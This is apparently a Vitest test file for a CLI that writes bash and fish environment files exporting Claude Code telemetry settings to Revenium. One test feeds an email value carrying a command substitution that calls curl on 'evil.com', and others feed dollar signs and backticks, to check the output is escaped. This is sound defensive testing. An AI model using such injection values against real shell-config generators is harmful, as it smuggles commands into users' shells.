import { describe, it, expect } from "vitest";
import { generateEnvContent, generateFishContent } from "../../../src/claude-code/config/writer.js";
import type { ClaudeCodeConfig } from "../../../src/claude-code/config/loader.js";

const minimalConfig: ClaudeCodeConfig = {
  apiKey: "hak_testkey123",
  endpoint: "https://api.revenium.ai",
};

const fullConfig: ClaudeCodeConfig = {
  apiKey: "hak_fullkey456",
  endpoint: "https://api.revenium.ai",
  email: "user@example.com",
  organizationName: "Acme Corp",
  productName: "Widget API",
  extraUsageEnabled: true,
  teamId: "teamHash123",
};

describe("generateEnvContent — all fields populated", () => {
  it("includes REVENIUM_SUBSCRIBER_EMAIL", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("export REVENIUM_SUBSCRIBER_EMAIL=");
    expect(output).toContain('"user@example.com"');
  });

  it("includes CLAUDE_CODE_EXTRA_USAGE_ENABLED=1 when extraUsageEnabled is true", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("export CLAUDE_CODE_EXTRA_USAGE_ENABLED=1");
  });

  it("includes REVENIUM_TEAM_ID when configured", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain('export REVENIUM_TEAM_ID="teamHash123"');
  });

  it("includes organization.name in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("organization.name=Acme Corp");
  });

  it("includes product.name in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("product.name=Widget API");
  });

  it("includes user.email in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("user.email=user@example.com");
  });

  it("stamps revenium.middleware.source=revenium-cli in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).toContain("revenium.middleware.source=revenium-cli");
  });
});

describe("generateEnvContent — management API endpoint override", () => {
  it("writes REVENIUM_MGMT_ENDPOINT when an explicit override is configured", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      managementEndpoint: "https://mgmt.example.com",
    };
    const output = generateEnvContent(config);
    expect(output).toContain('export REVENIUM_MGMT_ENDPOINT="https://mgmt.example.com"');
  });

  it("omits REVENIUM_MGMT_ENDPOINT when no override is set (default resolved at call time)", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("REVENIUM_MGMT_ENDPOINT");
  });
});

describe("generateEnvContent — no cost_multiplier anywhere", () => {
  it("does not include cost_multiplier in output for full config", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).not.toContain("cost_multiplier");
  });

  it("does not include COST_MULTIPLIER env var", () => {
    const output = generateEnvContent(fullConfig);
    expect(output).not.toContain("COST_MULTIPLIER");
  });

  it("does not include cost_multiplier in minimal config output", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("cost_multiplier");
  });
});

describe("generateEnvContent — user.email in OTEL_RESOURCE_ATTRIBUTES", () => {
  it("includes user.email in OTEL_RESOURCE_ATTRIBUTES when email is set", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "solo@example.com",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toContain("user.email=solo@example.com");
  });

  it("still writes OTEL_RESOURCE_ATTRIBUTES (channel marker only) when email is not set", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toContain("revenium.middleware.source=revenium-cli");
    expect(output).not.toContain("user.email=");
  });
});

describe("generateEnvContent — EXTRA_USAGE_ENABLED", () => {
  it("writes CLAUDE_CODE_EXTRA_USAGE_ENABLED=1 when extraUsageEnabled is true", () => {
    const config: ClaudeCodeConfig = { ...minimalConfig, extraUsageEnabled: true };
    const output = generateEnvContent(config);
    expect(output).toContain("export CLAUDE_CODE_EXTRA_USAGE_ENABLED=1");
  });

  it("writes CLAUDE_CODE_EXTRA_USAGE_ENABLED=0 when extraUsageEnabled is false", () => {
    const config: ClaudeCodeConfig = { ...minimalConfig, extraUsageEnabled: false };
    const output = generateEnvContent(config);
    expect(output).toContain("export CLAUDE_CODE_EXTRA_USAGE_ENABLED=0");
  });

  it("omits CLAUDE_CODE_EXTRA_USAGE_ENABLED when extraUsageEnabled is undefined", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("CLAUDE_CODE_EXTRA_USAGE_ENABLED");
  });
});

describe("generateEnvContent — minimal config", () => {
  it("includes telemetry enabled, endpoint, headers, protocol, logs exporter", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).toContain("export CLAUDE_CODE_ENABLE_TELEMETRY=1");
    expect(output).toContain("export OTEL_EXPORTER_OTLP_ENDPOINT=");
    expect(output).toContain("export OTEL_EXPORTER_OTLP_HEADERS=");
    expect(output).toContain("export OTEL_EXPORTER_OTLP_PROTOCOL=http/json");
    expect(output).toContain("export OTEL_LOGS_EXPORTER=otlp");
  });

  it("does not include subscription or email, but does write the channel-marker OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateEnvContent(minimalConfig);
    expect(output).not.toContain("CLAUDE_CODE_SUBSCRIPTION");
    expect(output).not.toContain("REVENIUM_SUBSCRIBER_EMAIL");
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toContain("revenium.middleware.source=revenium-cli");
  });
});

describe("generateEnvContent — shell metacharacters in OTEL_RESOURCE_ATTRIBUTES", () => {
  it("escapes dollar signs in organization name", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      organizationName: "Org$Corp",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("organization.name=Org%24Corp");
    expect(output).not.toContain("organization.name=Org$Corp");
  });

  it("escapes backticks in product name", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      productName: "prod`test`",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("product.name=prod%60test%60");
    expect(output).not.toContain("product.name=prod`test`");
  });

  it("escapes backslashes in email", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "user\\evil@example.com",
    };
    const output = generateEnvContent(config);
    expect(output).toContain("user.email=user%5Cevil@example.com");
  });

  it("neutralizes command substitution in email within OTEL_RESOURCE_ATTRIBUTES", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "attacker$(curl evil.com)@example.com",
    };
    const output = generateEnvContent(config);
    const otelLine = output.split("\n").find((l) => l.includes("OTEL_RESOURCE_ATTRIBUTES"));
    expect(otelLine).toContain("user.email=attacker%24(curl evil.com)@example.com");
    expect(otelLine).not.toContain("$(curl");
  });
});

describe("generateFishContent — mirrors bash content semantically", () => {
  it("uses set -gx instead of export for TELEMETRY_ENABLED", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("set -gx CLAUDE_CODE_ENABLE_TELEMETRY 1");
    expect(output).not.toContain("export CLAUDE_CODE_ENABLE_TELEMETRY");
  });

  it("includes user.email in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("user.email=user@example.com");
  });

  it("includes organization.name in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("organization.name=Acme Corp");
  });

  it("includes product.name in OTEL_RESOURCE_ATTRIBUTES", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("product.name=Widget API");
  });

  it("writes CLAUDE_CODE_EXTRA_USAGE_ENABLED=1 with fish syntax", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("set -gx CLAUDE_CODE_EXTRA_USAGE_ENABLED 1");
  });

  it("includes REVENIUM_TEAM_ID with fish syntax", () => {
    const output = generateFishContent(fullConfig);
    expect(output).toContain("set -gx REVENIUM_TEAM_ID 'teamHash123'");
  });

  it("includes REVENIUM_MGMT_ENDPOINT with fish syntax when overridden", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      managementEndpoint: "https://mgmt.example.com",
    };
    const output = generateFishContent(config);
    expect(output).toContain("set -gx REVENIUM_MGMT_ENDPOINT 'https://mgmt.example.com'");
  });

  it("omits REVENIUM_MGMT_ENDPOINT with fish syntax when not overridden", () => {
    const output = generateFishContent(minimalConfig);
    expect(output).not.toContain("REVENIUM_MGMT_ENDPOINT");
  });

  it("writes CLAUDE_CODE_EXTRA_USAGE_ENABLED=0 when false", () => {
    const config: ClaudeCodeConfig = { ...minimalConfig, extraUsageEnabled: false };
    const output = generateFishContent(config);
    expect(output).toContain("set -gx CLAUDE_CODE_EXTRA_USAGE_ENABLED 0");
  });

  it("omits CLAUDE_CODE_EXTRA_USAGE_ENABLED when undefined", () => {
    const output = generateFishContent(minimalConfig);
    expect(output).not.toContain("CLAUDE_CODE_EXTRA_USAGE_ENABLED");
  });

  it("does not include cost_multiplier", () => {
    const output = generateFishContent(fullConfig);
    expect(output).not.toContain("cost_multiplier");
  });

  it("includes user.email in OTEL_RESOURCE_ATTRIBUTES when only email is set", () => {
    const config: ClaudeCodeConfig = {
      ...minimalConfig,
      email: "solo@example.com",
    };
    const output = generateFishContent(config);
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toContain("user.email=solo@example.com");
  });

  it("stamps revenium.middleware.source=revenium-cli even on minimal config", () => {
    const output = generateFishContent(minimalConfig);
    expect(output).toContain("OTEL_RESOURCE_ATTRIBUTES");
    expect(output).toContain("revenium.middleware.source=revenium-cli");
    expect(output).not.toContain("user.email=");
  });
});
